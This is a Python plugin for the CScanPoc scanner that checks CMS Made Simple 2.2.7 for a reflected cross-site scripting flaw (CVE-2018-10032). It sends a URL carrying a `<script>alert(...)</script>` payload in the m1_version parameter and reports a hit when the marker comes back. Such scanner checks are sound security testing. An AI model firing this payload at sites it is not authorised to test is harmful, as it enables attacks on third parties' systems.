# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CMSMS_0111'  # 平台漏洞编号
    name = 'CMS Made Simple(CMSMS)admin/moduleinterface.php反射型跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-05-03'  # 漏洞公布时间
    desc = '''模版漏洞描述
    CMS Made Simple(简称CMSMS)是一款优秀的轻量级开源内容管理系统(CMS)。
    通过m1_name参数在admin / moduleinterface.php中反射XSS
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08867'  # 漏洞来源
    cnvd_id = 'CNVD-2018-08867'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10032'  # cve编号
    product = 'CMSMS'  # 漏洞组件名称
    product_version = '2.2.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8dcab26e-b47b-421d-86cb-7649f338d422'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/cmsms2.2.7/admin/moduleinterface.php?mact=ModuleManager,m1_,moduledepends,0&__c=3da8342831010e889e2&m1_name=Adherents&m1_version=0.2.6<script>alert(cscanhyhm2n)</script>&m1_filename=Adherents-0.2.6.xml"
            vul_url = self.target + payload
            _response = requests.get(vul_url)
            if _response.code == 200 and "cscanhyhm2n" in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
